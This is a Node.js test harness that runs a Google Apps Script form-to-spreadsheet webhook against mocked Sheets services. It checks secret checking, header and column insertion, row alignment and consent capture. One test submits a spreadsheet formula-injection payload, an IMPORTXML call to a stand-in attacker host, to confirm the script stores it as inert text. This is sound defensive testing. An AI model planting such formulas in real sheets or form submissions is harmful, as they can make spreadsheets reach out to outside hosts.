/** Runs scripts/google-sheets-webhook.gs against a fake spreadsheet.
 *
 *  WHY. That file cannot be run anywhere but inside Google, and the part of it
 *  most likely to be wrong is the part hardest to eyeball: it maintains its own
 *  header row and INSERTS a column mid-sheet the first time a form sends a
 *  field nothing has sent before. Get that wrong and the damage is silent and
 *  cumulative -- values land under the wrong headings and nobody notices until
 *  someone reads the sheet.
 *
 *  The .gs source is evaluated here, unmodified, against stand-ins for
 *  SpreadsheetApp, LockService and ContentService, so what is tested is the
 *  file that gets pasted into Apps Script rather than a copy of its logic.
 *
 *  Run: node scripts/check-sheets-webhook.mjs
 */

import { readFileSync } from "node:fs";
import vm from "node:vm";

/* --------------------------------------------------- a fake Google sheet */

function makeSheet() {
  /** Row-major grid. Grows as the script writes to it, exactly as Sheets does. */
  let grid = [];

  const ensure = (rows, cols) => {
    while (grid.length < rows) grid.push([]);
    for (const row of grid) while (row.length < cols) row.push("");
  };

  return {
    grid: () => grid,
    getLastRow: () => grid.length,
    getLastColumn: () => grid.reduce((max, row) => Math.max(max, row.length), 0),
    setFrozenRows: () => {},
    getRange(row, col, numRows = 1, numCols = 1) {
      return {
        setValues(values) {
          ensure(row + values.length - 1, col + values[0].length - 1);
          values.forEach((line, r) =>
            line.forEach((cell, c) => {
              grid[row - 1 + r][col - 1 + c] = cell;
            }),
          );
          return this;
        },
        getValues() {
          ensure(row + numRows - 1, col + numCols - 1);
          return Array.from({ length: numRows }, (_, r) =>
            Array.from({ length: numCols }, (_, c) => grid[row - 1 + r][col - 1 + c] ?? ""),
          );
        },
        setValue(v) {
          ensure(row, col);
          grid[row - 1][col - 1] = v;
          return this;
        },
        setFontWeight() {
          return this;
        },
      };
    },
    appendRow(values) {
      grid.push([...values]);
    },
    insertColumnBefore(position) {
      // Sheets shifts every row, which is exactly why insertion is safe for
      // rows already written. Reproduced faithfully so the test would catch it
      // if the script inserted at the wrong index.
      const width = Math.max(...grid.map((r) => r.length), position);
      for (const row of grid) {
        while (row.length < width) row.push("");
        row.splice(position - 1, 0, "");
      }
    },
  };
}

/* --------------------------------------------------------------- harness */

let failures = 0;
function check(label, condition, detail = "") {
  if (condition) console.log(`  ✓ ${label}`);
  else {
    failures += 1;
    console.log(`  ✗ ${label}${detail ? `\n      ${detail}` : ""}`);
  }
}

const sheet = makeSheet();
const source = readFileSync("scripts/google-sheets-webhook.gs", "utf8");

const context = {
  SpreadsheetApp: {
    openById: () => ({
      getSheetByName: () => sheet,
      insertSheet: () => sheet,
    }),
  },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  ContentService: {
    MimeType: { JSON: "application/json" },
    createTextOutput: (text) => ({ setMimeType: () => ({ text }) }),
  },
  console,
};
vm.createContext(context);
vm.runInContext(source, context);

// The pasted file ships with a placeholder secret it deliberately refuses to
// run with. Set a real one, the way step 3 of its instructions tells you to.
vm.runInContext("SECRET = 'test-secret';", context);

const call = (body) => {
  const out = vm.runInContext("doPost", context)({ postData: { contents: JSON.stringify(body) } });
  return JSON.parse(out.text);
};

const headers = () => sheet.grid()[0] ?? [];
const lastRow = () => sheet.grid()[sheet.grid().length - 1] ?? [];
const cell = (name) => lastRow()[headers().indexOf(name)];

const base = {
  timestamp: "2026-09-10 14:32:05",
  timestampIso: "2026-09-10T10:32:05.000Z",
  formName: "CTA Band",
  pageName: "Google Ads Agency Dubai",
  pagePath: "/services/performance-marketing/google-ads",
  pageUrl: "https://enhmedia.com/services/performance-marketing/google-ads",
  ip: "94.200.1.55",
  userAgent: "Mozilla/5.0",
  recaptcha: "0.9",
  consent: "",
};

console.log("\nThe secret");
check("a wrong secret is refused", call({ secret: "nope", row: base }).ok === false);
check("nothing was written", sheet.grid().length === 0, JSON.stringify(sheet.grid()));

console.log("\nA standard six-field enquiry");
let res = call({
  secret: "test-secret",
  row: {
    ...base,
    fields: [
      { id: "name", label: "Name", value: "Layla Haddad" },
      { id: "email", label: "Email", value: "layla@example.com" },
      { id: "phone", label: "Phone", value: "+971 50 123 4567" },
      { id: "company", label: "Company", value: "Example Trading LLC" },
      { id: "services", label: "Services", value: "Google Ads" },
      { id: "message", label: "Message", value: "Help with search." },
    ],
  },
});
check("accepted", res.ok === true, JSON.stringify(res));
check(
  "headers are lead, then fields, then the technical block",
  headers().join(" | ") ===
    "Timestamp (UAE) | Form Name | Page Name | Page URL | Name | Email | Phone | Company | Services | Message | Consent | IP Address | reCAPTCHA | User Agent | Page Path | Submitted (UTC)",
  headers().join(" | "),
);
check("timestamp landed", cell("Timestamp (UAE)") === "2026-09-10 14:32:05");
check("form name landed", cell("Form Name") === "CTA Band");
check("page name landed", cell("Page Name") === "Google Ads Agency Dubai");
check("email landed under Email", cell("Email") === "layla@example.com");
check("IP landed under IP Address", cell("IP Address") === "94.200.1.55");
check("row width matches the header width", lastRow().length === headers().length);

console.log("\nAn SEO-page enquiry, which asks two questions nothing else asks");
res = call({
  secret: "test-secret",
  row: {
    ...base,
    formName: "Hero Enquiry",
    pageName: "SEO Audit",
    fields: [
      { id: "name", label: "Name", value: "Omar Nasser" },
      { id: "email", label: "Email", value: "omar@example.com" },
      { id: "website", label: "Website", value: "https://example.com" },
      // Deliberately a different label for the same id as last time. It must
      // reuse the Services column rather than opening a second one.
      { id: "services", label: "Services you are interested in", value: "SEO Audit" },
      { id: "requirements", label: "Tell us about your requirements", value: "Rankings dropped." },
    ],
  },
});
check("accepted", res.ok === true, JSON.stringify(res));
check(
  "Website and Requirements were inserted BEFORE the technical block",
  headers().join(" | ") ===
    "Timestamp (UAE) | Form Name | Page Name | Page URL | Name | Email | Phone | Company | Services | Message | Website | Requirements | Consent | IP Address | reCAPTCHA | User Agent | Page Path | Submitted (UTC)",
  headers().join(" | "),
);
check(
  "a changed label did NOT open a second Services column",
  headers().filter((h) => h === "Services").length === 1,
);
check("the new values landed under their new headers", cell("Website") === "https://example.com" && cell("Requirements") === "Rankings dropped.");
check("this form's blank fields are blank, not shifted", cell("Phone") === "" && cell("Company") === "" && cell("Message") === "");

console.log("\nThe row written BEFORE those columns existed");
const firstRow = sheet.grid()[1];
const idx = (name) => headers().indexOf(name);
check(
  "its email is still under Email after two insertions",
  firstRow[idx("Email")] === "layla@example.com",
  `found "${firstRow[idx("Email")]}"`,
);
check(
  "its IP is still under IP Address, not shifted two columns left",
  firstRow[idx("IP Address")] === "94.200.1.55",
  `found "${firstRow[idx("IP Address")]}"`,
);

console.log("\nFormula injection through a visitor-typed field");
res = call({
  secret: "test-secret",
  row: {
    ...base,
    fields: [
      { id: "name", label: "Name", value: '=IMPORTXML("https://evil.test","//a")' },
      { id: "email", label: "Email", value: "eve@example.com" },
      { id: "phone", label: "Phone", value: "+971501234567" },
    ],
  },
});
check("accepted", res.ok === true);
check(
  "the formula is stored as text, not left live",
  String(cell("Name")).startsWith("'="),
  `found "${cell("Name")}"`,
);
check(
  "a leading + in a phone number is also neutralised",
  String(cell("Phone")).startsWith("'+"),
  `found "${cell("Phone")}"`,
);

console.log("\nConsent, which only the contact form sends");
res = call({
  secret: "test-secret",
  row: {
    ...base,
    formName: "Contact Consultation",
    consent: "Yes",
    fields: [
      { id: "name", label: "Name", value: "Sara Aziz" },
      { id: "email", label: "Email", value: "sara@example.com" },
    ],
  },
});
check("consent recorded", cell("Consent") === "Yes");

console.log(failures === 0 ? "\nAll checks passed.\n" : `\n${failures} check(s) FAILED.\n`);
process.exit(failures === 0 ? 0 : 1);
